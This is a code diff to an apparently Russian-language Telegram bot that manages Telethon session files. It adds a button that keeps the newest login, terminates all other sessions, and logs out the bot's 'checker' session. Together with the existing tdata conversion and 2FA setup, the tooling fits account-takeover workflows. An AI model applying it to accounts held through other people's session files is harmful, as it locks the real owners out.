@@ -653,6 +653,40 @@ async def set_cloud_password(session_path, password, lib_type="telethon"):
         logging.error(f"2FA Error: {e}")
         return False
 
+def authorization_timestamp(auth):
+    date_active = getattr(auth, "date_active", None)
+    date_created = getattr(auth, "date_created", None)
+    return date_active or date_created or datetime.min
+
+async def terminate_old_authorizations_keep_latest(session_path: str):
+    async with TelegramClient(session_path, API_ID, API_HASH) as client:
+        if not await client.is_user_authorized():
+            raise RuntimeError("сессия чекера не авторизована")
+
+        result = await client(functions.account.GetAuthorizationsRequest())
+        authorizations = result.authorizations
+        other_authorizations = [auth for auth in authorizations if not getattr(auth, "current", False)]
+        keep_auth = max(other_authorizations, key=authorization_timestamp) if other_authorizations else None
+
+        terminated_old = 0
+        for auth in other_authorizations:
+            if keep_auth and auth.hash == keep_auth.hash:
+                continue
+            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+            terminated_old += 1
+
+        await client.log_out()
+
+    return {
+        "kept": {
+            "app_name": getattr(keep_auth, "app_name", None),
+            "device_model": getattr(keep_auth, "device_model", None),
+            "date_active": str(getattr(keep_auth, "date_active", "")),
+        } if keep_auth else None,
+        "terminated_old": terminated_old,
+        "checker_logged_out": True,
+    }
+
 # --- ХЭНДЛЕРЫ ---
 
 @router.message(Command("start"))
@@ -981,6 +1015,7 @@ async def show_session_menu(message: types.Message, session_name: str, is_edit=F
     else:
         if session_type == "telethon":
             builder.row(types.InlineKeyboardButton(text="Конвертировать в tdata", callback_data=f"convert_session_tdata:{key}"))
+            builder.row(types.InlineKeyboardButton(text="Оставить новую, завершить старые", callback_data=f"terminate_old_confirm:{key}"))
         builder.row(types.InlineKeyboardButton(text="Установить 2FA", callback_data=f"setup_2fa:{key}"))
     builder.row(types.InlineKeyboardButton(text="Удалить из бота", callback_data=f"delete_local_confirm:{key}"))
     builder.row(types.InlineKeyboardButton(text="Завершить сессию", callback_data=f"terminate:{key}"))
@@ -1231,6 +1266,61 @@ async def action_delete_local(callback: types.CallbackQuery):
         return
 
     await callback.message.edit_text(f"{session_name} удалена из бота. Аккаунт не завершался.")
+
+@router.callback_query(F.data.startswith("terminate_old_confirm:"))
+async def action_terminate_old_confirm(callback: types.CallbackQuery):
+    session_name = resolve_account_key(callback.data.split(":")[1])
+    if not session_name:
+        await callback.answer("Сессия не найдена", show_alert=True)
+        return
+
+    key = account_key(session_name)
+    builder = InlineKeyboardBuilder()
+    builder.row(types.InlineKeyboardButton(text="Да, оставить новую", callback_data=f"terminate_old:{key}"))
+    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data=f"manage:{key}"))
+    await callback.message.edit_text(
+        "Подтвердите действие.\n\n"
+        "Бот оставит самую новую сессию аккаунта, которая НЕ является текущей сессией чекера. "
+        "Все остальные старые сессии будут завершены. После этого текущая сессия чекера тоже выйдет из аккаунта "
+        "и будет удалена из бота.\n\n"
+        "Нажимайте только после того, как уже вошли в нужную новую сессию по коду.",
+        reply_markup=builder.as_markup()
+    )
+
+@router.callback_query(F.data.startswith("terminate_old:"))
+async def action_terminate_old(callback: types.CallbackQuery):
+    session_name = resolve_account_key(callback.data.split(":")[1])
+    if not session_name:
+        await callback.answer("Сессия не найдена", show_alert=True)
+        return
+
+    if get_session_type(session_name) != "telethon":
+        await callback.answer("Доступно только для Telethon .session", show_alert=True)
+        return
+
+    path = os.path.join(SESSION_DIR, session_name)
+    await callback.answer("Завершаю старые сессии...")
+
+    try:
+        result = await terminate_old_authorizations_keep_latest(path)
+        if os.path.exists(path):
+            os.remove(path)
+        remove_from_history(session_name)
+    except Exception as e:
+        await callback.message.answer(f"Ошибка завершения старых сессий: {e}")
+        return
+
+    kept = result.get("kept")
+    kept_text = "новая сессия не найдена"
+    if kept:
+        kept_text = f"{kept.get('app_name') or 'unknown'} | {kept.get('device_model') or 'unknown'} | {kept.get('date_active') or ''}"
+
+    await callback.message.edit_text(
+        "Готово.\n\n"
+        f"Завершено старых сессий: {result['terminated_old']}\n"
+        f"Оставлена: {kept_text}\n"
+        "Сессия чекера завершена и удалена из бота."
+    )
 
 @router.message(SessionStates.waiting_for_2fa)
 async def process_2fa_input(message: types.Message, state: FSMContext):
